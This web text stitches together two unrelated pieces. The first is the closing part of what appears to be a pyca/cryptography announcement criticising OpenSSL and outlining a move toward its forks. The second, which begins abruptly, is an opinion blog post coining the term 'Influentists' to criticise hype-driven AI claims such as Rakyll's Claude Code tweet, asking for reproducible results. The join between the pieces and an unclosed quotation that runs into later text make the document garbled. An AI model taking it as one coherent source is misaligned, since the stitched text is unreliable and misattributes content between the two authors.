<p>The world has changed. Nearly 5 years ago, <code><span>pyca/cryptography</span></code> issued our first release incorporating Rust code, and since then we have migrated nearly all functionality to Rust, using a mix of pure-Rust for all parsing and X.509 operations combined with using OpenSSL for providing cryptographic algorithms — gaining performance wins and avoiding several OpenSSL CVEs. <a href="https://www.youtube.com/watch?v=z_Eiy2W0APU">We know these transitions are possible</a>.</p>
<p>A library committed to security needs to make a long-term commitment to a migration to a memory safe programming language. OpenSSL has shown no initiative at all on this issue.</p>
</section>
<section id="contributing-causes">
<h2>Contributing Causes<a href="#contributing-causes" title="Link to this heading"></a></h2>
<p>Whenever issues with an open source project are raised, many will suggest this is an issue of funding or tragedy of the commons. This is inapposite, in the past decade, post-Heartbleed, OpenSSL has received considerable funding, and at this moment the OpenSSL Corporation and Foundation employ more software engineers than work full time on either BoringSSL or LibreSSL. The problems we have described are not ones caused by underfunding.</p>
<p>We do not fully understand the motivations that led to the public APIs and internal complexity we’ve described here. We’ve done our best to reverse engineer them by asking “what would motivate someone to do this” and often we’ve found ourselves coming up short. The fact that none of the other OpenSSL forks have made these same design choices is informative to the question of “was this necessary”.</p>
</section>
<section id="future-directions">
<h2>Future Directions<a href="#future-directions" title="Link to this heading"></a></h2>
<p>Our experience with OpenSSL has been on a negative trajectory for several years. As a result of these issues, we are making the following changes to our (admittedly undocumented) policies.</p>
<p>First, we will no longer require OpenSSL implementations for new functionality. Where we deem it desirable, we will add new APIs that are only on LibreSSL/BoringSSL/AWS-LC. Concretely, we expect to add ML-KEM and ML-DSA APIs that are only available with LibreSSL/BoringSSL/AWS-LC, and not with OpenSSL.</p>
<p>Second, we currently statically link a copy of OpenSSL in our wheels (binary artifacts). We are beginning the process of looking into what would be required to change our wheels to link against one of the OpenSSL forks.</p>
<p>If we are able to successfully switch to one of OpenSSL’s forks for our binary wheels, we will begin considering the circumstances under which we would drop support for OpenSSL entirely.</p>
<p>Lastly, in the long term, we are actively tracking non-OpenSSL derived cryptography libraries such as Graviola as potential alternatives.</p>
<p>We recognize that changes in which libraries we use to provide cryptographic implementations have substantial impact on our users — particularly redistributors. We do not contemplate these steps lightly, nor do we anticipate making them hastily. However, due to the gravity of our concerns, we are compelled to act. If you rely on <code><span>pyca/cryptography</span></code>’s support for OpenSSL, the best way to avoid the most drastic steps contemplated here is to engage with the OpenSSL project and contribute to improvements on these axes.</p>

<div id="readability-page-1" class="page"><div>
      <p>Last week, the developer community was busy discussing about a single tweet:</p>
<blockquote><p lang="en" dir="ltr">I'm not joking and this isn't funny. We have been trying to build distributed agent orchestrators at Google since last year. There are various options, not everyone is aligned... I gave Claude Code a description of the problem, it generated what we built last year in an hour.</p>— Jaana Dogan ヤナ ドガン (@rakyll) <a href="https://twitter.com/rakyll/status/2007239758158975130?ref_src=twsrc%5Etfw">January 2, 2026</a></blockquote>



<p>The author is Jaana Dogan (known as <a href="https://github.com/rakyll">Rakyll</a>), a highly respected figure in the Google ecosystem, in the open-source world, and in my heart (thank you Rakyll for your great <a href="https://rakyll.org/">Go blog posts</a>).</p>
<p>At first glance, the tweet suggests an enormous shift in the software industry: the ability to build <strong>in just one hour</strong> what previously required weeks or months for a team of sofware engineers, using <strong>just</strong> the description of the problem. The tweet was too-much dramatic in my own opinion, but actually impressive!</p>
<p>The post triggered an immediate wave of “doom-posting,” with many fearing for the future of software engineering (as each week since a year now).
However, as the conversation reached a high number of replies and citations on social networks, Rakyll released a follow-up thread to provide context:</p>
<blockquote><div lang="en" dir="ltr"><p>To cut through the noise on this topic, it’s helpful to provide more more context:</p><p>- We have built several versions of this system last year. - There are tradeoffs and there hasn't been a clear winner.<br>- When prompted with the best ideas that survived, coding agents are able to… <a href="https://t.co/k5FvAah7yc">https://t.co/k5FvAah7yc</a></p></div>— Jaana Dogan ヤナ ドガン (@rakyll) <a href="https://twitter.com/rakyll/status/2007659740126761033?ref_src=twsrc%5Etfw">January 4, 2026</a></blockquote>



<p>This response thread revealed a story <strong>far less miraculous</strong> than the original tweet suggested.
Let’s analyze it.</p>
<p>Crucially, <strong>the foundational “thinking” had already been performed by Rakyll herself</strong>, who guided the AI using architectural concepts (honed over several weeks or months of prior effort) rather than the AI thinking and inventing the “product” from scratch.<br>
Furthermore, <strong>the resulting project was strictly a proof-of-concept</strong> that falls far short of a production-ready system capable of managing real-world complexity.<br>
And finally, this success hinged on the Rakyll’s <strong>implicit domain knowledge and deep expertise</strong>. The last point is often (strategically?) omitted from these “magic” viral demonstrations in order to make the tool appear way more autonomous than it truly is.</p>
<p>Hmm. Now, this is far less exciting…</p>
<h2 id="under-influence">
  Under influence
  <a href="#under-influence">#</a>
</h2>
<p>This pattern of “<em>hype first and context later</em>” is actually part of a growing trend.</p>
<p>I call the individuals participating to that trend “<strong>The Influentists</strong>”.
Those people are members of a scientific or technical community, and leverage their large audiences to propagate claims that are, at best, unproven and, at worst, <em>intentionally</em> misleading.</p>
<p>But how can we spot them?</p>
<p>I personally identify these “Influentists” by four personality traits that characterize their public discourse.<br>
The first is a reliance on <strong>"<em>trust-me-bro</em>" culture</strong>, where anecdotal experiences are framed as universal, objective truths to generate hype. This is a sentiment perfectly captured by the <em>“I’m not joking and this isn’t funny”</em> tone of Rakyll’s original tweet, but also the dramatic <em>“I’ve never felt that much behind as a programmer”</em> from Andrej Karpathy’s tweet.
This is supported by an <strong>absence of reproducible proof</strong>, as these individuals rarely share the code, data, or methodology behind their viral “wins”, an omission made easier than ever in the current LLM era.
And finally, they utilize <strong>strategic ambiguity</strong>, carefully wording their claims with enough vagueness to pivot toward a “clarification” if the technical community challenges their accuracy.</p>
<blockquote><p lang="en" dir="ltr">I've never felt this much behind as a programmer. The profession is being dramatically refactored as the bits contributed by the programmer are increasingly sparse and between.

<p>Rakyll is far from alone. We see this “hype-first” approach across major AI firms like Anthropic, OpenAI, or Microsoft.</p>
<p>Consider Galen Hunt, a Distinguished Engineer at Microsoft. He recently made waves by claiming a goal to rewrite Microsoft’s massive C/C++ codebases into Rust by 2030 using AI.</p>

<p>When the industry pointed out the near-impossible complexity of this task, but also asking clarity for popular and critical products like Microsoft Windows, he was forced to clarify that it was only a “research project”.</p>

<p>Similarly, engineers from Anthropic and OpenAI oftenly post teasers about “AGI being achieved internally” to release months later models that disappoint the crowd.</p>
<blockquote><p lang="en" dir="ltr">Wait, can we consider seriously the hypothesis that 1) the recent hyped tweets from OA's staff <br>2) "AGI has been achieved internally" <br>3) sama's comments on the qualification of slow or fast takeoff hinging on the date you count from <br>4) sama's comments on 10000x researchers <br>are… <a href="https://t.co/f57g7dXMhM">https://t.co/f57g7dXMhM</a> <a href="https://t.co/Gap3V7VqkK">pic.twitter.com/Gap3V7VqkK</a></p>— Siméon (@Simeon_Cps) <a href="https://twitter.com/Simeon_Cps/status/1706078819617063304?ref_src=twsrc%5Etfw">September 24, 2023</a></blockquote>

<p>Similarly, many other companies lie over what they are solving or willing to solve:</p>

<p>When leaders at major labs propagate these hyped-based results, it can create a “technical debt of expectations” for the rest of us.
Junior developers see these viral threads and feel they are failing because they can’t reproduce a year of work in an hour, not realizing the “magic” was actually a highly-curated prototype guided by a decade of hidden expertise.</p>
<p>We must stop granting automatic authority to those who rely on hype, or vibes, rather than evidence.<br>
If a tool or methodology were truly as revolutionary as claimed, then it wouldn’t need a viral thread to prove its worth
because <strong>the results would speak for themselves</strong>.</p>
<p>The tech community must shift its admiration back toward <strong>reproducible results</strong> and away from this “<em>trust-me-bro</em>” culture.</p>
